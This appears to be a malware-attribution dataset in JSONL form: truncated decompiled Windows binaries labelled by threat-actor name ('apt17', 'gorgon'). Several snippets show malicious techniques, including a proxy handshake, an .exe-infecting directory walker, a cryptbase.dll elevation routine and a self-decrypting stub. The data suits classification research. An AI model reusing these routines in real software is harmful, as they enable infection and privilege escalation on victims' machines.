{"author": "apt17", "label": 4, "inputs": "_WORD *__thiscall sub_32001000(_WORD *this, int a2, __int16 a3, int a4)\n{\n  _WORD *result; // eax\n\n  result = this;\n  this[8] = a3;\n  *((_DWORD *)this + 5) = a4;\n  *((_BYTE *)this + 5) = 0;\n  *((_BYTE *)this + 4) = 0;\n  *((_DWORD *)this + 8) = 0;\n  *((_DWORD *)this + 3) = 0;\n  *(_DWORD *)this = a2;\n  *((_DWORD *)this + 2) = 0;\n  return result;\n}\n__int16 __thiscall sub_3200102C(_WORD *this)\n{\n  return this[8];\n}\nint __thiscall sub_32001031(_DWORD *this)\n{\n  return this[5];\n}\nint __thiscall sub_32001035(_DWORD *this)\n{\n  return this[3];\n}\nint __thiscall sub_32001039(_DWORD *this)\n{\n  return this[8];\n}\nint __thiscall sub_3200103D(_DWORD *this, int a2)\n{\n  int result; // eax\n\n  result = a2;\n  this[3] = a2;\n  return result;\n}\nint __thiscall sub_32001047(_DWORD *this, int a2)\n{\n  int result; // eax\n\n  result = a2;\n  this[2] = a2;\n  return result;\n}\nint __thiscall sub_32001051(int this)\n{\n  int result; // eax\n  __int16 v3; // ax\n  char v4[8]; // [esp+4h] [ebp-8h] BYREF\n\n  result = sub_32001035((_DWORD *)this);\n  if ( result != 4 )\n  {\n    v3 = *(_WORD *)(this + 16);\n    *(_WORD *)&v4[3] = -1;\n    *(_WORD *)&v4[1] = v3;\n    v4[0] = -117;\n    result = sub_320015D3((int)v4, 5u);\n  }\n  return result;\n}\nint __thiscall sub_32001085(int this, int a2, _DWORD *a3)\n{\n  if ( *(_BYTE *)(this + 5) != 1 )\n  {\n    if ( *(_BYTE *)(this + 4) != 0xC1 )\n      return 0;\n    if ( *(_BYTE *)a2 != 5 || *(_BYTE *)(a2 + 1) || *(_BYTE *)(a2 + 2) || *(_BYTE *)(a2 + 3) != 1 )\n    {\nLABEL_9:\n      *(_BYTE *)(this + 4) = -1;\n      return 0;\n    }\n    if ( *a3 == 10 )\n    {\n      *(_DWORD *)(this + 24) = *(_DWORD *)(a2 + 4);\n      *(_WORD *)(this + 28) = ntohs(*(_WORD *)(a2 + 8));\n      *(_BYTE *)(this + 5) = 1;\n      goto LABEL_9;\n    }\n  }\n  return -1;\n}\nBOOL __thiscall sub_320010E0(LPVOID lpParameter, int a2, int len)\n{\n  unsigned __int8 v4; // al\n  bool v5; // zf\n  char v6; // al\n  int v7; // eax\n  int v9; // eax\n\n  v4 = *((_BYTE *)lpParameter + 4);\n  if ( v4 < 0xB0u )\n  {\n    switch ( v4 )\n    {\n      case 0u:\n        if ( *(_BYTE *)a2 == 5 && l"}
{"author": "apt17", "label": 4, "inputs": "char *__thiscall sub_401000(char *this)\n{\n  *((_DWORD *)this + 5) = 0;\n  *(_DWORD *)this = 0;\n  *((_DWORD *)this + 1) = 0;\n  *((_DWORD *)this + 6) = 0;\n  *((_DWORD *)this + 2) = 0;\n  this[12] = 0;\n  *(_DWORD *)(this + 13) = 0;\n  this[17] = 0;\n  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 28));\n  return this;\n}\nunsigned __int8 *__cdecl sub_401050(unsigned __int8 *String)\n{\n  unsigned __int8 *result; // eax\n\n  result = _mbsrchr(String, 0x2Eu);\n  if ( result )\n    ++result;\n  return result;\n}\nint __cdecl sub_401070(const char *a1)\n{\n  char v2; // [esp+4h] [ebp-310h] BYREF\n  char v3[259]; // [esp+5h] [ebp-30Fh] BYREF\n  char v4; // [esp+108h] [ebp-20Ch] BYREF\n  char v5[259]; // [esp+109h] [ebp-20Bh] BYREF\n  char Buffer[260]; // [esp+20Ch] [ebp-108h] BYREF\n\n  v4 = 0;\n  memset(v5, 0, sizeof(v5));\n  v2 = 0;\n  memset(v3, 0, sizeof(v3));\n  sprintf(Buffer, \"%s%s\", ::Buffer, \"tsb.msc\");\n  sprintf(&v4, \"%s\", a1);\n  sprintf(&v2, \"%s -binder \\\"%s\\\"\", Buffer, &v4);\n  return dword_43FA58(&v2, 0);\n}\nint __cdecl sub_401140(const char *a1, int a2)\n{\n  int v2; // edi\n  int v3; // ebx\n  unsigned __int8 *v5; // eax\n  char v6[44]; // [esp+10h] [ebp-248h] BYREF\n  char String1[276]; // [esp+3Ch] [ebp-21Ch] BYREF\n  char Buffer[260]; // [esp+150h] [ebp-108h] BYREF\n\n  v2 = 0;\n  if ( a2 )\n    sprintf(Buffer, \"%s\\\\*.exe\", a1);\n  else\n    sprintf(Buffer, \"%s\\\\*.*\", a1);\n  v3 = dword_43F9F4(Buffer, v6);\n  if ( v3 == -1 )\n    return 0;\n  do\n  {\n    if ( _stricmp(String1, word_430454) && _stricmp(String1, \"..\") )\n    {\n      if ( (v6[0] & 0x10) != 0 )\n      {\n        if ( !a2 )\n        {\n          sprintf(Buffer, \"%s\\\\%s\", a1, String1);\n          v2 += sub_401140(Buffer, 1);\n        }\n      }\n      else\n      {\n        v5 = sub_401050((unsigned __int8 *)String1);\n        if ( v5 && !_stricmp((const char *)v5, \"exe\") )\n        {\n          sprintf(Buffer, \"%s\\\\%s\", a1, String1);\n          sub_401070(Buffer);\n          ++v2;\n        }\n      }\n    }\n  }\n  while ( dword_43F9F8(v3, v6) );\n  dword_43F9FC(v3);\n  return v2;\n}\nint __cdecl sub_4012"}
{"author": "apt17", "label": 4, "inputs": "HMODULE __cdecl sub_10001000(LPCSTR lpModuleName)\n{\n  HMODULE result; // eax\n\n  result = GetModuleHandleA(lpModuleName);\n  if ( !result )\n    result = LoadLibraryA(lpModuleName);\n  return result;\n}\nint __cdecl sub_10001020(int a1)\n{\n  int v2; // [esp+10h] [ebp-4h] BYREF\n\n  v2 = 0;\n  dword_10042BE0(a1, 0, &unk_10007158, &v2);\n  return v2;\n}\nvoid __cdecl sub_10001050(int a1, int a2)\n{\n  HMODULE v2; // eax\n  int v3; // edi\n  int v4; // esi\n  LPVOID ppv; // [esp+28h] [ebp-4h] BYREF\n\n  v2 = sub_10001000(aShell32Dll);\n  SHCreateItemFromParsingName = (HRESULT (__stdcall *)(PCWSTR, IBindCtx *, const IID *const, void **))GetProcAddress(v2, ProcName);\n  ppv = 0;\n  CoInitialize(0);\n  v3 = sub_10001020(a1);\n  v4 = sub_10001020(a2);\n  if ( v4 )\n  {\n    CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv);\n    if ( ppv )\n    {\n      (*(void (__stdcall **)(LPVOID, int))(*(_DWORD *)ppv + 20))(ppv, 277086228);\n      (*(void (__stdcall **)(LPVOID, int, int, wchar_t *, _DWORD))(*(_DWORD *)ppv + 64))(ppv, v3, v4, aCryptbaseDll, 0);\n      (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 84))(ppv);\n    }\n    (*(void (__stdcall **)(int))(*(_DWORD *)v4 + 8))(v4);\n  }\n  if ( v3 )\n    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 8))(v3);\n  if ( ppv )\n    (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);\n  CoUninitialize();\n}\nint __cdecl sub_10001120(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPCSTR lpFileName)\n{\n  const CHAR *v3; // esi\n  HANDLE v5; // esi\n\n  v3 = lpFileName;\n  DeleteFileA(lpFileName);\n  if ( !lpBuffer )\n    return 0;\n  v5 = CreateFileA(v3, 0x40000000u, 2u, 0, 2u, 0x80u, 0);\n  if ( v5 == (HANDLE)-1 )\n    return 0;\n  lpFileName = 0;\n  WriteFile(v5, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&lpFileName, 0);\n  CloseHandle(v5);\n  return 1;\n}\nint __cdecl sub_10001190(int a1, _BYTE *a2, int a3)\n{\n  int v3; // ecx\n  _BYTE *i; // eax\n\n  v3 = 0;\n  if ( a3 <= 0 )\n    return 1;\n  for ( i = a2; i[a1 - (_DWORD)a2] == *i; ++i )\n  {\n    if ( ++v3 >= a3 )\n      return 1;\n  }\n  return 0;\n}\nint __cdecl sub_100011D0(int a1, int a2, _B"}
{"author": "apt17", "label": 4, "inputs": "// attributes: thunk\nint _vbaChkstk()\n{\n  return __vbaChkstk();\n}\n// attributes: thunk\nint _vbaExceptHandler()\n{\n  return __vbaExceptHandler();\n}\n// attributes: thunk\nint DllFunctionCall()\n{\n  return __imp_DllFunctionCall();\n}\n// attributes: thunk\nint EVENT_SINK_QueryInterface()\n{\n  return __imp_EVENT_SINK_QueryInterface();\n}\n// attributes: thunk\nint EVENT_SINK_AddRef()\n{\n  return __imp_EVENT_SINK_AddRef();\n}\n// attributes: thunk\nint EVENT_SINK_Release()\n{\n  return __imp_EVENT_SINK_Release();\n}\n// attributes: thunk\nint ThunRTMain()\n{\n  return __imp_ThunRTMain();\n}\nint sub_402244()\n{\n  int (*v1)(void); // eax\n\n  if ( dword_4032DC )\n    return dword_4032DC();\n  v1 = (int (*)(void))DllFunctionCall();\n  return v1();\n}\n// positive sp value has been detected, the output may be wrong!\nint __stdcall sub_402731(int a1, int a2, int a3, int a4)\n{\n  return 0;\n}\n"}
{"author": "gorgon", "label": 5, "inputs": "// attributes: thunk\nint _vbaExceptHandler()\n{\n  return __vbaExceptHandler();\n}\n// attributes: thunk\nint DllFunctionCall()\n{\n  return __imp_DllFunctionCall();\n}\n// attributes: thunk\nint _vbaHresultCheckObj()\n{\n  return __vbaHresultCheckObj();\n}\n// attributes: thunk\nint _vbaSetSystemError()\n{\n  return __vbaSetSystemError();\n}\n// attributes: thunk\nint __stdcall rtcEnvironVar(int a1, int a2)\n{\n  return __imp_rtcEnvironVar(a1, a2);\n}\n// attributes: thunk\nint _vbaFreeStr()\n{\n  return __vbaFreeStr();\n}\n// attributes: thunk\nint __stdcall rtcGetDateVar(int a1)\n{\n  return __imp_rtcGetDateVar(a1);\n}\n// attributes: thunk\nint _vbaStrVarVal()\n{\n  return __vbaStrVarVal();\n}\n// attributes: thunk\nint __stdcall rtcGetDateValue(int a1, int a2)\n{\n  return __imp_rtcGetDateValue(a1, a2);\n}\n// attributes: thunk\nint _vbaVarMove()\n{\n  return __vbaVarMove();\n}\n// attributes: thunk\nint __stdcall rtcDateAdd(int a1, int a2, int a3, int a4, int a5)\n{\n  return __imp_rtcDateAdd(a1, a2, a3, a4, a5);\n}\n// attributes: thunk\nint _vbaStrVarMove()\n{\n  return __vbaStrVarMove();\n}\n// attributes: thunk\nint _vbaR8IntI4()\n{\n  return __vbaR8IntI4();\n}\n// attributes: thunk\nint _vbaFreeVar()\n{\n  return __vbaFreeVar();\n}\n// attributes: thunk\nint __stdcall rtcStringBstr(int a1, int a2)\n{\n  return __imp_rtcStringBstr(a1, a2);\n}\n// attributes: thunk\nint _vbaVarDup()\n{\n  return __vbaVarDup();\n}\n// attributes: thunk\nint __stdcall rtcBstrFromFormatVar(int a1, int a2, int a3, int a4)\n{\n  return __imp_rtcBstrFromFormatVar(a1, a2, a3, a4);\n}\n// attributes: thunk\nint __stdcall rtcAtn(int a1, int a2)\n{\n  return __imp_rtcAtn(a1, a2);\n}\n// attributes: thunk\nint __stdcall rtcTypeName(int a1)\n{\n  return __imp_rtcTypeName(a1);\n}\n// attributes: thunk\nint __stdcall rtcLog(int a1, int a2)\n{\n  return __imp_rtcLog(a1, a2);\n}\n// attributes: thunk\nint rtcGetDateBstr()\n{\n  return __imp_rtcGetDateBstr();\n}\n// attributes: thunk\nint __stdcall rtcSpaceBstr(int a1)\n{\n  return __imp_rtcSpaceBstr(a1);\n}\n// attributes: thunk\nint __stdcall rtcStrReverse(int a1)\n{\n  return __imp_rtcStrRevers"}
{"author": "gorgon", "label": 5, "inputs": "// attributes: thunk\nint _vbaChkstk()\n{\n  return __vbaChkstk();\n}\n// attributes: thunk\nint _vbaExceptHandler()\n{\n  return __vbaExceptHandler();\n}\n// attributes: thunk\nvoid __noreturn _vbaFPException()\n{\n  __vbaFPException();\n}\n// attributes: thunk\nint DllFunctionCall()\n{\n  return __imp_DllFunctionCall();\n}\n// attributes: thunk\nint EVENT_SINK_QueryInterface()\n{\n  return __imp_EVENT_SINK_QueryInterface();\n}\n// attributes: thunk\nint EVENT_SINK_AddRef()\n{\n  return __imp_EVENT_SINK_AddRef();\n}\n// attributes: thunk\nint EVENT_SINK_Release()\n{\n  return __imp_EVENT_SINK_Release();\n}\n// attributes: thunk\nint ThunRTMain()\n{\n  return __imp_ThunRTMain();\n}\nint __usercall sub_402B60@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebp>)\n{\n  void *retaddr[2]; // [esp+0h] [ebp+0h]\n\n  return MK_FP(retaddr[0], retaddr[0])(a2, *(_DWORD *)(a3 - 34) ^ a1);\n}\nint sub_403338()\n{\n  int (*v1)(void); // eax\n\n  if ( dword_479EB0 )\n    return dword_479EB0();\n  v1 = (int (*)(void))DllFunctionCall();\n  return v1();\n}\nint sub_403538()\n{\n  int (*v1)(void); // eax\n\n  if ( dword_479F04 )\n    return dword_479F04();\n  v1 = (int (*)(void))DllFunctionCall();\n  return v1();\n}\nint sub_40357C()\n{\n  int (*v1)(void); // eax\n\n  if ( dword_479F10 )\n    return dword_479F10();\n  v1 = (int (*)(void))DllFunctionCall();\n  return v1();\n}\n// positive sp value has been detected, the output may be wrong!\nvoid sub_47830B()\n{\n  ;\n}\n// attributes: thunk\nvoid __noreturn j___vbaFPException()\n{\n  _vbaFPException();\n}\n"}
{"author": "gorgon", "label": 5, "inputs": "// attributes: thunk\nHANDLE __stdcall GetStdHandle(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nLONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)\n{\n  return __imp_UnhandledExceptionFilter(ExceptionInfo);\n}\n// attributes: thunk\nBOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)\n{\n  return __imp_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);\n}\n// attributes: thunk\nLPSTR __stdcall CharNextA(LPCSTR lpsz)\n{\n  return __imp_CharNextA(lpsz);\n}\n// attributes: thunk\nvoid __stdcall __noreturn ExitProcess(UINT uExitCode)\n{\n  __imp_ExitProcess(uExitCode);\n}\n// attributes: thunk\nint __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)\n{\n  return __imp_MessageBoxA(hWnd, lpText, lpCaption, uType);\n}\n// attributes: thunk\nBOOL __stdcall FindClose(HANDLE hFindFile)\n{\n  return __imp_FindClose(hFindFile);\n}\n// attributes: thunk\nHANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)\n{\n  return __imp_FindFirstFileA(lpFileName, lpFindFileData);\n}\n// attributes: thunk\nBOOL __stdcall FreeLibrary(HMODULE hLibModule)\n{\n  return __imp_FreeLibrary(hLibModule);\n}\n// attributes: thunk\nLPSTR __stdcall GetCommandLineA()\n{\n  return __imp_GetCommandLineA();\n}\n// attributes: thunk\nint __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)\n{\n  return __imp_GetLocaleInfoA(Locale, LCType, lpLCData, cchData);\n}\n// a"}
{"author": "gorgon", "label": 5, "inputs": "int sub_401000()\n{\n  sub_43B441(&unk_4C4144);\n  return atexit(sub_43B6D9);\n}\nint sub_401016()\n{\n  sub_404AD2();\n  return atexit(sub_43B6E3);\n}\nint sub_401027()\n{\n  sub_404A10();\n  return atexit(sub_43B6E9);\n}\nint sub_401038()\n{\n  return atexit(sub_43B6EE);\n}\nint sub_401044()\n{\n  sub_403CA8();\n  return atexit(sub_43B6F3);\n}\nint sub_401055()\n{\n  sub_402649();\n  return atexit(sub_43B6F8);\n}\nint __thiscall sub_401066(void *this)\n{\n  sub_40F8CF(this);\n  return atexit(sub_43B6FD);\n}\nint __thiscall sub_401078(void *this)\n{\n  sub_4071EB((char *)&dword_4C5310 + *(_DWORD *)(dword_4C5310 + 4), this);\n  return atexit(sub_43B712);\n}\nint sub_401098()\n{\n  sub_404233();\n  return atexit(sub_43B717);\n}\nint sub_4010A9()\n{\n  sub_4085F4();\n  return atexit(sub_43B71C);\n}\nint sub_4010BA()\n{\n  sub_415E86();\n  return atexit(sub_43B721);\n}\nint sub_4010CB()\n{\n  sub_4077C7(&unk_4C6404);\n  return atexit(sub_43B730);\n}\nvoid *__thiscall sub_4010F0(void *Block, int a2)\n{\n  int v3; // ebx\n  char *v4; // edi\n\n  v3 = 13;\n  v4 = (char *)Block + 364;\n  do\n  {\n    v4 -= 16;\n    sub_405A64(v4);\n    --v3;\n  }\n  while ( v3 >= 0 );\n  sub_405A64((char *)Block + 108);\n  sub_405A64((char *)Block + 40);\n  j__free_0(Block);\n  return Block;\n}\n_DWORD *__thiscall sub_40112A(_DWORD *this)\n{\n  char *v2; // edi\n  int i; // ebx\n  _DWORD *result; // eax\n\n  this[7] = -1;\n  *this = 0;\n  this[2] = 0;\n  this[3] = 0;\n  this[4] = 2;\n  this[5] = 0;\n  this[6] = 0;\n  this[8] = 0;\n  this[9] = 0;\n  sub_4077C7(this + 10);\n  *((_WORD *)this + 28) = 0;\n  *((_BYTE *)this + 58) = 1;\n  this[15] = 0;\n  this[16] = 0;\n  this[19] = -1;\n  this[20] = -1;\n  this[21] = -1;\n  this[22] = -1;\n  this[23] = -1;\n  this[24] = -1;\n  this[25] = -1;\n  sub_4077C7(this + 27);\n  this[33] = 0;\n  this[34] = 2;\n  v2 = (char *)(this + 35);\n  this[31] = 85;\n  this[32] = 400;\n  for ( i = 13; i >= 0; --i )\n  {\n    sub_4077C7(v2);\n    v2 += 16;\n  }\n  this[99] = -1;\n  this[100] = -1;\n  this[111] = -1;\n  this[112] = -1;\n  this[91] = 0;\n  this[92] = 0;\n  this[93] = 0;\n  this[94] = 0;\n  this[95] = 0;\n  this[96] = 0;"}
{"author": "gorgon", "label": 5, "inputs": "BOOL __thiscall sub_401000(_DWORD *this)\n{\n  BOOL result; // eax\n  int v2; // [esp+0h] [ebp-3A8h] BYREF\n  int v3[233]; // [esp+4h] [ebp-3A4h] BYREF\n\n  result = 0;\n  if ( byte_4974EA )\n  {\n    byte_4974EA = 0;\n    this[103] = 0;\n    memset(v3, 0, sizeof(v3));\n    v2 = 936;\n    v3[0] = (int)hWndNewOwner;\n    v3[1] = 1;\n    result = Shell_NotifyIconW(2u, (PNOTIFYICONDATAW)&v2);\n  }\n  return result;\n}\nvoid __usercall sub_401070(int a1@<esi>)\n{\n  void *v1; // eax\n\n  if ( *(_DWORD *)(a1 + 36) )\n    free(*(void **)(a1 + 36));\n  v1 = *(void **)(a1 + 44);\n  *(_DWORD *)(a1 + 36) = 0;\n  if ( v1 )\n    operator delete(v1);\n  *(_DWORD *)(a1 + 44) = 0;\n  *(_DWORD *)(a1 + 48) = 0;\n  *(_DWORD *)(a1 + 52) = 0;\n  *(_DWORD *)(a1 + 56) = 0;\n  *(_BYTE *)(a1 + 16) = 0;\n}\n_DWORD *__usercall sub_4010A0@<eax>(_DWORD *a1@<edi>, int a2@<esi>)\n{\n  _DWORD *result; // eax\n\n  if ( *(_BYTE *)(a2 + 9) )\n  {\n    result = *(_DWORD **)(a2 + 4);\n    *result = *a1;\n    ++*(_DWORD *)a2;\n    *(_BYTE *)(a2 + 9) = 0;\n  }\n  else\n  {\n    result = operator new(8u);\n    if ( result )\n    {\n      *result = *a1;\n      result[1] = *(_DWORD *)(a2 + 4);\n      ++*(_DWORD *)a2;\n      *(_DWORD *)(a2 + 4) = result;\n    }\n    else\n    {\n      result = 0;\n      MEMORY[4] = *(_DWORD *)(a2 + 4);\n      ++*(_DWORD *)a2;\n      *(_DWORD *)(a2 + 4) = 0;\n    }\n  }\n  return result;\n}\nint __stdcall sub_4010E0(int a1, int a2, int a3, int a4)\n{\n  return sub_401100(a1, a3, a4);\n}\nLRESULT __userpurge sub_401100@<eax>(UINT a1@<edi>, HWND hWnd, WPARAM wParam, LPARAM lParam)\n{\n  HWND v4; // ebx\n  LRESULT result; // eax\n  char v6; // al\n\n  v4 = hWnd;\n  if ( hWnd != hWndNewOwner && hWndNewOwner )\n    return DefWindowProcW(v4, a1, wParam, lParam);\n  if ( a1 < 0x111 && a1 >= 0x12 )\n  {\nLABEL_4:\n    if ( a1 == dword_4A95E8 && byte_4974EA == 1 )\n    {\n      sub_401000(&dword_4A8710);\n      sub_40E0C0();\n    }\n    return DefWindowProcW(v4, a1, wParam, lParam);\n  }\n  if ( a1 == 275 )\n  {\n    sub_401250(&dword_4A8710);\n    return 0;\n  }\n  if ( a1 > 0x10 )\n  {\n    if ( a1 > 0x312 )\n    {\n      if"}
{"author": "gorgon", "label": 5, "inputs": "// attributes: thunk\nHANDLE __stdcall GetStdHandle(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nLONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)\n{\n  return __imp_UnhandledExceptionFilter(ExceptionInfo);\n}\n// attributes: thunk\nBOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)\n{\n  return __imp_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);\n}\n// attributes: thunk\nLPSTR __stdcall CharNextA(LPCSTR lpsz)\n{\n  return __imp_CharNextA(lpsz);\n}\n// attributes: thunk\nvoid __stdcall __noreturn ExitProcess(UINT uExitCode)\n{\n  __imp_ExitProcess(uExitCode);\n}\n// attributes: thunk\nint __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)\n{\n  return __imp_MessageBoxA(hWnd, lpText, lpCaption, uType);\n}\n// attributes: thunk\nBOOL __stdcall FindClose(HANDLE hFindFile)\n{\n  return __imp_FindClose(hFindFile);\n}\n// attributes: thunk\nHANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)\n{\n  return __imp_FindFirstFileA(lpFileName, lpFindFileData);\n}\n// attributes: thunk\nBOOL __stdcall FreeLibrary(HMODULE hLibModule)\n{\n  return __imp_FreeLibrary(hLibModule);\n}\n// attributes: thunk\nLPSTR __stdcall GetCommandLineA()\n{\n  return __imp_GetCommandLineA();\n}\n// attributes: thunk\nint __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)\n{\n  return __imp_GetLocaleInfoA(Locale, LCType, lpLCData, cchData);\n}\n// a"}
{"author": "gorgon", "label": 5, "inputs": "void __usercall __noreturn start(int a1@<eax>, int a2@<ebx>)\n{\n  sub_810009(a2, a1);\n  __debugbreak();\n}\n// positive sp value has been detected, the output may be wrong!\nint __cdecl sub_810009()\n{\n  _BYTE *v0; // eax\n  _BYTE *v2; // [esp-Ch] [ebp-Ch]\n  int v3; // [esp-4h] [ebp-4h]\n  void *retaddr; // [esp+0h] [ebp+0h]\n\n  v0 = v2 - 1327112;\n  if ( *v2 == 0xCC )\n  {\n    *v2 = 0;\n    v0 = (_BYTE *)sub_810044(v0, 4096, 654862634, 1448000018);\n  }\n  retaddr = v0;\n  return v3;\n}\nint __stdcall sub_810044(_DWORD *a1, unsigned int a2, int a3, int a4)\n{\n  unsigned int i; // ecx\n  int v7; // [esp+4h] [ebp-4h]\n\n  for ( i = a2 >> 2; i; --i )\n  {\n    *a1 ^= a3;\n    *a1++ += a4;\n  }\n  return v7;\n}\n"}
{"author": "gorgon", "label": 5, "inputs": "// attributes: thunk\nHANDLE __stdcall GetStdHandle(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nLONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)\n{\n  return __imp_UnhandledExceptionFilter(ExceptionInfo);\n}\n// attributes: thunk\nBOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)\n{\n  return __imp_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);\n}\n// attributes: thunk\nLPSTR __stdcall CharNextA(LPCSTR lpsz)\n{\n  return __imp_CharNextA(lpsz);\n}\n// attributes: thunk\nvoid __stdcall __noreturn ExitProcess(UINT uExitCode)\n{\n  __imp_ExitProcess(uExitCode);\n}\n// attributes: thunk\nint __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)\n{\n  return __imp_MessageBoxA(hWnd, lpText, lpCaption, uType);\n}\n// attributes: thunk\nBOOL __stdcall FindClose(HANDLE hFindFile)\n{\n  return __imp_FindClose(hFindFile);\n}\n// attributes: thunk\nHANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)\n{\n  return __imp_FindFirstFileA(lpFileName, lpFindFileData);\n}\n// attributes: thunk\nBOOL __stdcall FreeLibrary(HMODULE hLibModule)\n{\n  return __imp_FreeLibrary(hLibModule);\n}\n// attributes: thunk\nLPSTR __stdcall GetCommandLineA()\n{\n  return __imp_GetCommandLineA();\n}\n// attributes: thunk\nint __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)\n{\n  return __imp_GetLocaleInfoA(Locale, LCType, lpLCData, cchData);\n}\n// a"}
{"author": "gorgon", "label": 5, "inputs": "BOOL __thiscall sub_401000(_DWORD *this)\n{\n  BOOL result; // eax\n  int v2; // [esp+0h] [ebp-3A8h] BYREF\n  int v3[233]; // [esp+4h] [ebp-3A4h] BYREF\n\n  result = 0;\n  if ( byte_4974EA )\n  {\n    byte_4974EA = 0;\n    this[103] = 0;\n    memset(v3, 0, sizeof(v3));\n    v2 = 936;\n    v3[0] = (int)hWndNewOwner;\n    v3[1] = 1;\n    result = Shell_NotifyIconW(2u, (PNOTIFYICONDATAW)&v2);\n  }\n  return result;\n}\nvoid __usercall sub_401070(int a1@<esi>)\n{\n  void *v1; // eax\n\n  if ( *(_DWORD *)(a1 + 36) )\n    free(*(void **)(a1 + 36));\n  v1 = *(void **)(a1 + 44);\n  *(_DWORD *)(a1 + 36) = 0;\n  if ( v1 )\n    operator delete(v1);\n  *(_DWORD *)(a1 + 44) = 0;\n  *(_DWORD *)(a1 + 48) = 0;\n  *(_DWORD *)(a1 + 52) = 0;\n  *(_DWORD *)(a1 + 56) = 0;\n  *(_BYTE *)(a1 + 16) = 0;\n}\n_DWORD *__usercall sub_4010A0@<eax>(_DWORD *a1@<edi>, int a2@<esi>)\n{\n  _DWORD *result; // eax\n\n  if ( *(_BYTE *)(a2 + 9) )\n  {\n    result = *(_DWORD **)(a2 + 4);\n    *result = *a1;\n    ++*(_DWORD *)a2;\n    *(_BYTE *)(a2 + 9) = 0;\n  }\n  else\n  {\n    result = operator new(8u);\n    if ( result )\n    {\n      *result = *a1;\n      result[1] = *(_DWORD *)(a2 + 4);\n      ++*(_DWORD *)a2;\n      *(_DWORD *)(a2 + 4) = result;\n    }\n    else\n    {\n      result = 0;\n      MEMORY[4] = *(_DWORD *)(a2 + 4);\n      ++*(_DWORD *)a2;\n      *(_DWORD *)(a2 + 4) = 0;\n    }\n  }\n  return result;\n}\nint __stdcall sub_4010E0(int a1, int a2, int a3, int a4)\n{\n  return sub_401100(a1, a3, a4);\n}\nLRESULT __userpurge sub_401100@<eax>(UINT a1@<edi>, HWND hWnd, WPARAM wParam, LPARAM lParam)\n{\n  HWND v4; // ebx\n  LRESULT result; // eax\n  char v6; // al\n\n  v4 = hWnd;\n  if ( hWnd != hWndNewOwner && hWndNewOwner )\n    return DefWindowProcW(v4, a1, wParam, lParam);\n  if ( a1 < 0x111 && a1 >= 0x12 )\n  {\nLABEL_4:\n    if ( a1 == dword_4A95E8 && byte_4974EA == 1 )\n    {\n      